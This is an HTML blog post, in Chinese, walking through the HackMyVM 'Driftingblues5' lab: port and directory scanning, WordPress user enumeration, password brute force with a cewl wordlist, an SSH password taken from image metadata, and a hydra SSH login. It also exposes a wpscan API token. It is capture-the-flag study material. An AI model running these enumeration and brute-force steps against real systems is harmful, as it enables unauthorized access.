@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-Driftingblues5靶场复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Driftingblues5">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/57479.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-Driftingblues5靶场复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67f25d630ba3d5a1d7eec997.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67f25db30ba3d5a1d7eeca19.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67f26ffb0ba3d5a1d7eed586.png">
+<meta property="article:published_time" content="2025-04-06T10:46:52.000Z">
+<meta property="article:modified_time" content="2025-04-06T12:44:46.577Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67f25d630ba3d5a1d7eec997.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/57479.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Driftingblues5 | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">71</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/57479.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Driftingblues5
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-04-06 18:46:52 / 修改时间：20:44:46" itemprop="dateCreated datePublished" datetime="2025-04-06T18:46:52+08:00">2025-04-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67f25bd40ba3d5a1d7eec745.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-Driftingblues5靶场复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nmap -p- 192.168.64.174</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 18:11 CST</span><br><span class="line">Nmap scan report for bogon (192.168.64.174)</span><br><span class="line">Host is up (0.067s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: C8:21:58:16:CF:C4 (Intel Corporate)</span><br></pre></td></tr></table></figure></div>
+<p>就开放了这两个常用的端口，所以直接扫web目录</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# dirsearch -u 192.168.64.174                                                    </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /root/tmp/reports/_192.168.64.174/_25-04-06_18-12-11.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.64.174/</span><br><span class="line"></span><br><span class="line">[18:12:11] Starting: </span><br><span class="line">[18:12:14] 403 -  279B  - /.ht_wsr.txt                                      </span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccess.bak1                                   </span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccess.sample                                 </span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccess.save</span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccess.orig</span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccessBAK                                     </span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccess_extra</span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccessOLD</span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccess_sc</span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccess_orig</span><br><span class="line">[18:12:14] 403 -  279B  - /.htaccessOLD2                                    </span><br><span class="line">[18:12:14] 403 -  279B  - /.html                                            </span><br><span class="line">[18:12:14] 403 -  279B  - /.htm</span><br><span class="line">[18:12:14] 403 -  279B  - /.htpasswd_test                                   </span><br><span class="line">[18:12:14] 403 -  279B  - /.htpasswds</span><br><span class="line">[18:12:14] 403 -  279B  - /.httr-oauth</span><br><span class="line">[18:12:15] 403 -  279B  - /.php                                             </span><br><span class="line">[18:12:26] 301 -    0B  - /index.php  -&gt;  http://192.168.64.174/            </span><br><span class="line">[18:12:26] 404 -   10KB - /index.php/login/                                 </span><br><span class="line">[18:12:27] 200 -    7KB - /license.txt                                      </span><br><span class="line">[18:12:33] 200 -    3KB - /readme.html                                      </span><br><span class="line">[18:12:34] 403 -  279B  - /server-status/                                   </span><br><span class="line">[18:12:34] 403 -  279B  - /server-status                                    </span><br><span class="line">[18:12:37] 301 -  319B  - /wp-admin  -&gt;  http://192.168.64.174/wp-admin/    </span><br><span class="line">[18:12:37] 301 -  321B  - /wp-content  -&gt;  http://192.168.64.174/wp-content/</span><br><span class="line">[18:12:37] 500 -    0B  - /wp-admin/                                        </span><br><span class="line">[18:12:37] 200 -    0B  - /wp-content/</span><br><span class="line">[18:12:37] 200 -  477B  - /wp-content/uploads/                              </span><br><span class="line">[18:12:37] 200 -  481B  - /wp-content/upgrade/                              </span><br><span class="line">[18:12:37] 500 -    0B  - /wp-admin/admin-ajax.php                          </span><br><span class="line">[18:12:37] 500 -    0B  - /wp-config.php</span><br><span class="line">[18:12:37] 500 -    0B  - /wp-content/plugins/hello.php</span><br><span class="line">[18:12:37] 200 -   84B  - /wp-content/plugins/akismet/akismet.php           </span><br><span class="line">[18:12:37] 301 -  322B  - /wp-includes  -&gt;  http://192.168.64.174/wp-includes/</span><br><span class="line">[18:12:37] 200 -    0B  - /wp-includes/rss-functions.php                    </span><br><span class="line">[18:12:38] 200 -    4KB - /wp-includes/                                     </span><br><span class="line">[18:12:38] 500 -    0B  - /wp-cron.php                                      </span><br><span class="line">[18:12:38] 500 -    0B  - /wp-admin/install.php                             </span><br><span class="line">[18:12:38] 500 -    0B  - /wp-login.php                                     </span><br><span class="line">[18:12:38] 500 -    0B  - /wp-signup.php                                    </span><br><span class="line">[18:12:38] 500 -    0B  - /wp-admin/setup-config.php                        </span><br><span class="line">[18:12:38] 500 -    0B  - /xmlrpc.php</span><br></pre></td></tr></table></figure></div>
+<p>扫出的目录和wordpress相关，所以直接用wpscan扫一下用户名和插件，但是这里因为靶机很老，所以尽量不要用插件的漏洞</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wpscan --url 192.168.64.174 --api-token lbD2jRa091DWey2uosBWjfXVj7aZzGayIssDaIuPQSU --enumerate u,ap  --plugins-detection aggressive</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:09:58 &lt;=============================&gt; (109869 / 109869) 100.00% Time: 00:09:58</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] akismet</span><br><span class="line"> | Location: http://192.168.64.174/wp-content/plugins/akismet/</span><br><span class="line"> | Last Updated: 2025-02-14T18:49:00.000Z</span><br><span class="line"> | Readme: http://192.168.64.174/wp-content/plugins/akismet/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 5.3.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.64.174/wp-content/plugins/akismet/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | Version: 4.1.8 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.64.174/wp-content/plugins/akismet/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.64.174/wp-content/plugins/akismet/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] abuzerkomurcu</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://192.168.64.174/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] satanic</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] gill</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] collins</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] gadd</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] WPScan DB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 3</span><br><span class="line"> | Requests Remaining: 22</span><br><span class="line"></span><br><span class="line">[+] Finished: Sun Apr  6 18:28:22 2025</span><br><span class="line">[+] Requests Done: 109915</span><br><span class="line">[+] Cached Requests: 42</span><br><span class="line">[+] Data Sent: 29.409 MB</span><br><span class="line">[+] Data Received: 15.111 MB</span><br><span class="line">[+] Memory used: 429.746 MB</span><br><span class="line">[+] Elapsed time: 00:10:08</span><br></pre></td></tr></table></figure></div>
+<p>把扫到的用户名存起来<br>然后这里是我卡住的一个点，因为用常见的字典的话，用户名还多，爆破起来的时间就特别多，这里看了wp学到了crewl这个工具，这个工具是利用网页上的信息来生成一个字典</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cewl -d 2 -m 6 -w pass.txt -with-numbers 192.168.64.174</span><br><span class="line">CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat pass.txt | wc -l</span><br><span class="line">937</span><br><span class="line">   </span><br></pre></td></tr></table></figure></div>
+<p>可以看到这样子生成的字典就只有937<br>然后可以找到一个用户名和密码，但是没有什么用  后面会说到</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wpscan --url 192.168.64.174 -U a.txt -P pass.txt </span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 6 user/s</span><br><span class="line">[SUCCESS] - gill / interchangeable                                                                                 </span><br><span class="line">Trying  / Author Time: 00:05:18 &lt;=====================================        &gt; (5055 / 5991) 84.37%  ETA: ??:??:??</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67f25d630ba3d5a1d7eec997.png"><br>这里是第二个卡住我的点，登录上来之后，没有找到有用的信息或者什么可以利用php反弹shell的地方<br>这里要用到的是dblogo这个图片<br><img src="https://pic1.imgdb.cn/item/67f25db30ba3d5a1d7eeca19.png"><br>但是这个图片也可以在wp-content&#x2F;wp-upload这个页面直接得到，所以我说这个用户名和密码没有什么用<br>然后把可疑的图片下载下来之后用exiftool分析一下，发现有一个ssh密码的信息</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# exiftool dblogo.png </span><br><span class="line">ExifTool Version Number         : 13.00</span><br><span class="line">File Name                       : dblogo.png</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 19 kB</span><br><span class="line">File Modification Date/Time     : 2025:04:06 18:43:24+08:00</span><br><span class="line">File Access Date/Time           : 2025:04:06 18:45:07+08:00</span><br><span class="line">File Inode Change Date/Time     : 2025:04:06 18:45:07+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image/png</span><br><span class="line">Image Width                     : 300</span><br><span class="line">Image Height                    : 300</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB with Alpha</span><br><span class="line">Compression                     : Deflate/Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">SRGB Rendering                  : Perceptual</span><br><span class="line">Gamma                           : 2.2</span><br><span class="line">Pixels Per Unit X               : 2835</span><br><span class="line">Pixels Per Unit Y               : 2835</span><br><span class="line">Pixel Units                     : meters</span><br><span class="line">XMP Toolkit                     : Adobe XMP Core 5.6-c142 79.160924, 2017/07/13-01:06:39</span><br><span class="line">Creator Tool                    : Adobe Photoshop CC 2018 (Windows)</span><br><span class="line">Create Date                     : 2021:02:24 02:55:28+03:00</span><br><span class="line">Metadata Date                   : 2021:02:24 02:55:28+03:00</span><br><span class="line">Modify Date                     : 2021:02:24 02:55:28+03:00</span><br><span class="line">Instance ID                     : xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405</span><br><span class="line">Document ID                     : adobe:docid:photoshop:7232d876-a1d0-044b-9604-08837143888b</span><br><span class="line">Original Document ID            : xmp.did:5890be6c-649b-0248-af9b-19889727200c</span><br><span class="line">Color Mode                      : RGB</span><br><span class="line">ICC Profile Name                : sRGB IEC61966-2.1</span><br><span class="line">Format                          : image/png</span><br><span class="line">History Action                  : created, saved</span><br><span class="line">History Instance ID             : xmp.iid:5890be6c-649b-0248-af9b-19889727200c, xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405</span><br><span class="line">History When                    : 2021:02:24 02:55:28+03:00, 2021:02:24 02:55:28+03:00</span><br><span class="line">History Software Agent          : Adobe Photoshop CC 2018 (Windows), Adobe Photoshop CC 2018 (Windows)</span><br><span class="line">History Changed                 : /</span><br><span class="line">Text Layer Name                 : ssh password is 59583hello of course it is lowercase maybe not</span><br><span class="line">Text Layer Text                 : ssh password is 59583hello of course it is lowercase maybe not :)</span><br><span class="line">Document Ancestors              : adobe:docid:photoshop:871a8adf-5521-894c-8a18-2b27c91a893b</span><br><span class="line">Image Size                      : 300x300</span><br><span class="line">Megapixels                      : 0.090</span><br></pre></td></tr></table></figure></div>
+<p>密码<code>59583hello</code> 用hydra爆破一下 得到ssh的用户名和密码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -L a.txt -p 59583hello ssh://192.168.64.174                    </span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-06 18:45:47</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://192.168.64.174:22/</span><br><span class="line">[22][ssh] host: 192.168.64.174   login: gill   password: 59583hello</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-06 18:46:01</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>还是上来先看一下有没有sudo或者suid  结果都没有</p>
